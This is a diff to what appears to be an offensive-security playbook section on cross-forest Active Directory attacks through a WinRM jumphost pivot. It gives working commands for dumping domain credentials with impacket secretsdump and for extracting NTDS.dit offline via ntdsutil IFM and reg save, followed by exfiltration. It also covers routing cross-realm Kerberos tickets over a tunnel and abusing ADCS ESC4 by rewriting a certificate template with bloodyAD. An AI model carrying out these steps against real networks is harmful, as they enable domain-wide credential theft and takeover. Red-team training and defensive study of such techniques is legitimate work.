@@ -365,9 +365,9 @@ impacket-secretsdump -k -no-pass domain.local/<dc_hostname>$@<dc_fqdn>
 
 ---
 
-## Cross-forest ops from a constrained pivot (NAT'd attacker / network-logon jumphost)
+## Cross-forest ops from a constrained pivot (network-logon jumphost over a tunnel)
 
-Real-case shape: attacker box behind NAT (window-limited tunnel, see `offensive-tools/network/chisel`), foothold = a WinRM **network logon** on a jumphost in realm A, targets in trusted realm B reachable only through that jumphost. Recurring walls and fixes:
+Real-case shape: operator reaching realm B only through a pivot — a WinRM **network logon** on a jumphost in realm A, with targets in trusted realm B reachable only via that jumphost, usually over a tunnel. If that tunnel is slow or short-lived (see `offensive-tools/network/chisel` — often the target/lab network, not your transport), prefer the offline variants below. Recurring walls and fixes:
 
 - **A network-logon jumphost cannot inject or delegate tickets.** Rubeus `ptt`/`createnetonly` fail there (`LsaLookupAuthenticationPackage Error 1450`; or .NET SSPI `cannot generate SSPI context`) — the WinRM session holds only its inbound service ticket, no delegatable TGT. Do Kerberos in **userland** (impacket reads a ccache, no LSA) or move the ticket-consuming step to a **non-network-logon** (scheduled-task BATCH logon, or a host you hold interactively).
 
@@ -379,7 +379,7 @@ Real-case shape: attacker box behind NAT (window-limited tunnel, see `offensive-
 
 - **Cross-realm `getST`/`getTGT` routing over a loopback tunnel.** Do NOT pass `-dc-ip` (it pins every leg to one KDC → `KDC_ERR_WRONG_REALM`). Let krb5.conf route and map the foreign realm + DC names to the tunnel loopback in `/etc/hosts`, FQDN first: `127.0.0.1 dcB.realmB realmB REALMB` — impacket resolves the referral KDC by **realm name**, so the name must point at the tunnel.
 
-- **Prefer offline IFM over network DCSync when the pivot is window-limited.** As local admin on the target DC: `reg save HKLM\SYSTEM` + `ntdsutil "ac i ntds" "ifm" "create full <dir>" q q` (or `reg save` the hive), exfil, then `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`. Avoids a long DRSUAPI session over a tunnel that drops every few seconds.
+- **Prefer offline IFM over network DCSync when the tunnel is slow or short-lived.** As local admin on the target DC: `reg save HKLM\SYSTEM` + `ntdsutil "ac i ntds" "ifm" "create full <dir>" q q` (or `reg save` the hive), exfil, then `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`. Avoids a long DRSUAPI session over a tunnel that may stall or drop.
 
 - **Cross-forest ADCS ESC4** with `certipy template -write-default-configuration` often fails `KDC_ERR_WRONG_REALM` building the cross-forest HOST ticket. Instead set the template directly with a cross-realm `ldap/<ca-dc>` context: `bloodyAD -k -d <ownDom> -u <ca-manager> --host <ca-dc> set object '<template-dn>' msPKI-Certificate-Name-Flag -v -1577058303` then `... add genericAll '<template-dn>' '<enroller>'` (the manual flag alone yields `CERTSRV_E_TEMPLATE_DENIED` — you also need the Enroll ACE). `certipy req` needs `-target-ip <reachable-ca-ip>` when the CA's RPC endpoint resolves to an unreachable internal NIC.
 
